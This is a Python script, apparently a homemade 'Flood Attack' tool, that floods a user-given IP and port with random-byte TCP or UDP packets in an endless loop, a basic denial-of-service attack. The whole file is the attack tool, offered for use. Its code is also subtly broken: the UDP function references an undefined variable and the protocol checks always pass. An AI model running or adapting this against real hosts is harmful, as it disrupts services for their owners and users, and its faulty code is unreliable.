import socket
import sys
import os

banner = """
 ______ _                 _           _   _             _    
|  ____| |               | |     /\  | | | |           | |   
| |__  | | ___   ___   __| |    /  \ | |_| |_ __ _  ___| | __
|  __| | |/ _ \ / _ \ / _` |   / /\ \| __| __/ _` |/ __| |/ /
| |    | | (_) | (_) | (_| |  / ____ \ |_| || (_| | (__|   < 
|_|    |_|\___/ \___/ \__,_| /_/    \_\__|\__\__,_|\___|_|\_\

"""

# Function declaration part
def Usage():
    print("Usage: ", sys.argv[0], "<ip> <protocol> <port> <package size>")

def TCP_Attack(target, port, package_size):
    tcp_serv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    tcp_serv.connect((target, port))

    byte = os.urandom(package_size)
    
    sent = 1
    while True:
        tcp_serv.send(byte)
        print("Sending ", sent, "TCP Package with size ", package_size, "to", target, "on Port ", port)
        sent = sent + 1

def UDP_Attack(target, port, package):
    udp_serv = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    byte = os.urandom(package_size)

    sent = 1
    while True:
        udp_serv.sendto(byte, (target, port))
        print("Sending ", sent, "UDP Package with size ", package_size, "to ", target, "on Port ", port)
        sent = sent + 1

# Working part
class Main():
    print(banner)
    if len(sys.argv) != 5:
        Usage()

    else:
        if sys.argv[2] == "TCP" or "tcp":
            try:
                TCP_Attack(str(sys.argv[1]), int(sys.argv[3]), int(sys.argv[4]))

            except ConnectionRefusedError:
                print("Error, Connection Refused...!")
                sys.exit()

        if sys.argv[2] == "UDP" or "udp":
            try:
                UDP_Attack(str(sys.argv[1]), int(sys.argv[3]), int(sys.argv[4]))

            except ConnectionRefusedError:
                print("Error, Connection Refused...!")
                sys.exit()

if __name__ == "__main__":
    Main()
